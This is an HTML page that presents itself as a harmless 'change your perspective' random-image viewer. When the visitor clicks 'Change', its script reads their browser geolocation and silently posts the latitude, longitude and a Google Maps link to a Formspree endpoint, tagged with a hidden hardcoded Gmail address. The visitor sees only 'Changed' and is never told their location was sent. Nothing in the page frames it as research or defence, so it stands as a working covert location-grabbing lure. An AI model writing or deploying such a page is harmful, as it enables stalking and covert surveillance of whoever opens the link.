<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Konumu Mail ile Gönder</title>
    <style>
      body {
        font-family: Arial, sans-serif;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        height: 100vh;
        margin: 0;
      }
      img {
        width: 300px;
        height: 200px;
        object-fit: cover;
        border: 2px solid #ccc;
        border-radius: 10px;
        margin-bottom: 15px;
      }
      input,
      button {
        padding: 10px;
        margin: 5px;
        font-size: 16px;
      }
      button {
        cursor: pointer;
      }
      #status {
        margin-top: 10px;
        font-size: 14px;
        color: green;
      }
      #email {
        display: none;
      }
    </style>
  </head>
  <body>
    <h1>change your perspective</h1>
    <img id="randomImage" src="" alt="Rastgele Fotoğraf" />
    <input
      type="email"
      id="email"
      value="bakuhospitalityfactory@gmail.com"
      placeholder="e-mail"
      required
    />
    <button onclick="sendLocation()">Change</button>
    <p id="status"></p>

    <form
      id="locationForm"
      action="https://formspree.io/f/xanypezv"
      method="POST"
      style="display: none"
    >
      <input type="text" name="email" id="formEmail" />
      <input type="text" name="latitude" id="formLatitude" />
      <input type="text" name="longitude" id="formLongitude" />
      <input type="text" name="maps_link" id="formMapsLink" />
    </form>

    <script>
      async function fetchRandomImage() {
        const imgElement = document.getElementById("randomImage");
        try {
          imgElement.src = `https://picsum.photos/300/200?random=${Date.now()}`;
        } catch (error) {
          console.error("Random images error", error);
          imgElement.src = "";
        }
      }

      document.addEventListener("DOMContentLoaded", fetchRandomImage);

      function sendLocation() {
        const emailInput = document.getElementById("email").value;
        const status = document.getElementById("status");

        if (!emailInput) {
          alert("e-mail error");
          return;
        }

        if (!navigator.geolocation) {
          alert("Change browser settings");
          return;
        }

        navigator.geolocation.getCurrentPosition(
          (position) => {
            const { latitude, longitude } = position.coords;
            const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;

            document.getElementById("formEmail").value = emailInput;
            document.getElementById("formLatitude").value = latitude;
            document.getElementById("formLongitude").value = longitude;
            document.getElementById("formMapsLink").value = mapsLink;

            const form = document.getElementById("locationForm");
            const formData = new FormData(form);

            fetch(form.action, {
              method: "POST",
              body: formData,
              headers: {
                Accept: "application/json",
              },
            })
              .then((response) => {
                if (response.ok) {
                  status.textContent = "Changed";
                  fetchRandomImage();
                  console.log('birinci')
                } else {
                  status.textContent = "Try again";
                }
              })
              .catch(() => {
                status.textContent = "Try again. SET";
              });
          },
          (error) => {
            alert("Address" + error.message);
          }
        );
      }
    </script>
  </body>
</html>
